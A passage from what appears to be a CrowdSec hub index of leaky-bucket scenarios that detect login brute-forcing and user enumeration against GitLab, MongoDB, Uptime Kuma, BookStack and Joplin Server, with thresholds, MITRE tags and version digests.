gitlab\n  behavior: \"vcs:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Gitlab Bruteforce\"\n  remediation: true\n---\n# gitlab user enum bruteforce\ntype: leaky\nname: timokoessler/gitlab-bf_user-enum\ndescription: \"Detect gitlab user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'gitlab_failed_password'\"\nleakspeed: \"40s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nblackhole: 1m\nreprocess: true\nlabels:\n  service: gitlab\n  behavior: \"vcs:bruteforce\"\n  classification:\n    - attack.T1589\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Gitlab User Enumeration\"\n  remediation: true\n", "description": "Detect gitlab bruteforce", "path": "scenarios/timokoessler/gitlab-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "c41f3f4003eeb331fa35aa2ace0e861a674992efdb5a26c5f9d447db40a67eca"}, "0.2": {"digest": "2cd1a9d5dfd164c06ed4dd7a89104e1f25251ab4eb35c8f8f66890fbd127a6f5"}}}, "timokoessler/mongodb-bf": {"content": "# mongodb bruteforce\ntype: leaky\nname: timokoessler/mongodb-bf\ndescription: \"Detect mongodb bruteforce\"\nfilter: \"evt.Meta.log_type == 'mongodb_failed_auth'\"\nleakspeed: \"20s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: mongodb\n  classification:\n    - attack.T1110\n  behavior: \"database:bruteforce\"\n  label: \"MongoDB Bruteforce\"\n  spoofable: 0\n  confidence: 3\n  remediation: true\n---\n# mongodb user enum bruteforce\ntype: leaky\nname: timokoessler/mongodb-bf_user-enum\ndescription: \"Detect mongodb user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'mongodb_failed_auth'\"\nleakspeed: \"40s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nblackhole: 1m\nreprocess: true\nlabels:\n  service: mongodb\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"database:bruteforce\"\n  label: \"MongoDB User Enumeration\"\n  spoofable: 0\n  confidence: 3\n  remediation: true\n---\n# mongodb authentication database enum bruteforce\ntype: leaky\nname: timokoessler/mongodb-bf_auth-db-enum\ndescription: \"Detect mongodb authentication database enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'mongodb_failed_auth'\"\nleakspeed: \"40s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.authentication_database\nblackhole: 1m\nreprocess: true\nlabels:\n  service: mongodb\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"database:bruteforce\"\n  label: \"MongoDB Authentication Enumeration\"\n  spoofable: 0\n  confidence: 3\n  remediation: true\n", "description": "Detect mongodb bruteforce", "path": "scenarios/timokoessler/mongodb-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "2091dbe9f9e71d2f31a6c6dbcd1aaa5b8eb8215925bfdf8a36f9b3c1624cffcf"}, "0.2": {"digest": "df5a0f8e6bad0a57e451ba4c06adb9a2852b45a9c717917ff254b8d78ce06f80"}}}, "timokoessler/uptime-kuma-bf": {"content": "# Uptime Kuma bruteforce\ntype: leaky\nname: timokoessler/uptime-kuma-bf\ndescription: \"Detect Uptime Kuma bruteforce\"\nfilter: \"evt.Meta.log_type in ['uptime_kuma_failed_password', 'uptime_kuma_failed_totp']\"\nleakspeed: \"15s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: uptime-kuma\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Uptime Kuma Bruteforce\"\n  spoofable: 0\n  confidence: 3\n  remediation: true\n---\n# Uptime Kuma user enum bruteforce\ntype: leaky\nname: timokoessler/uptime-kuma-bf_user-enum\ndescription: \"Detect Uptime Kuma user enum bruteforce\"\nfilter: \"evt.Meta.log_type in ['uptime_kuma_failed_password', 'uptime_kuma_failed_totp']\"\nleakspeed: \"30s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nblackhole: 1m\nreprocess: true\nlabels:\n  service: uptime-kuma\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Uptime Kuma User Enumeration\"\n  spoofable: 0\n  confidence: 3\n  remediation: true\n", "description": "Detect Uptime Kuma bruteforce", "path": "scenarios/timokoessler/uptime-kuma-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "a50fbbc0db115694fc140607f27688c499d63b3702b2bc596809f3cfaeb58c02"}, "0.2": {"digest": "c78efdf197b94e8be0540b5d6e1bfa6c926cda8e8bd51969d8db4c3960eb9f04"}}}, "xs539/bookstack-bf": {"content": "type: leaky\nname: xs539/bookstack-bf\ndescription: \"Detect bookstack bruteforce\"\nfilter: \"evt.Meta.log_type == 'bookstack_failed_auth'\"\ngroupby: evt.Meta.source_ip\nleakspeed: 15m\ncapacity: 3\nblackhole: 1m\nlabels:\n  service: bookstack\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Bookstack Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n---\ntype: leaky\nname:  xs539/bookstack-bf_user-enum\ndescription: \"Detect bookstack bruteforce\"\nfilter: \"evt.Meta.log_type == 'bookstack_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 15m\ncapacity: 3\nblackhole: 1m\nlabels:\n  service: bookstack\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n  label: \"Bookstack User Enumeration\"\n  behavior: \"http:bruteforce\"\n  remediation: true", "description": "Detect bookstack bruteforce", "path": "scenarios/xs539/bookstack-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "828ad724c5f1e4753fcb812c7aea04fac5be2f1c0ef336bde572515496e6f3ff"}, "0.2": {"digest": "808f23a3c6324bfff37364a37ab62141ac8e0c124486a999ca9382ba8362de6e"}}}, "xs539/joplin-server-bf": {"content": "type: leaky\nname: xs539/joplin-server-bf\ndescription: \"Detect Joplin Server bruteforce\"\nfilter: \"evt.Meta.log_type == 'joplin_server_failed_auth'\"\ngroupby: evt.Meta.source_ip\nleakspeed: 15m\ncapacity: 3\nblackhole: 1m\nlabels:\n  service: joplin\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Joplin Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n---\ntype: leaky\nname:  xs539/joplin-server-bf_user-enum\ndescription: \"Detect Joplin Server bruteforce\"\nfilter: \"evt.Meta.log_type == 'joplin_server_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 15m\ncapacity: 3\nblackhole: 1m\nlabels:\n  service: joplin\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n  label: \"Joplin User Enumeration\"\n  behavior: \"http:bruteforce\"\n  remediation: true", "description": "Detect Joplin Server bruteforce", "path": "scenarios/xs539/joplin-server-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "0c145a9d2072160940cb9de1d84b19a92df3b5227581f008481a505f74301ffb"}, "0.2": {"digest": "5ffec4624031734a05c87617f2d4a242b04ab9ca5cfe54c78d4f2a91835ae7f3"}, "0.3": {"digest": "edb791f6bdcaca842a71097a78202b717ba499dad029513f71154e4a22e5b67e"}}}}}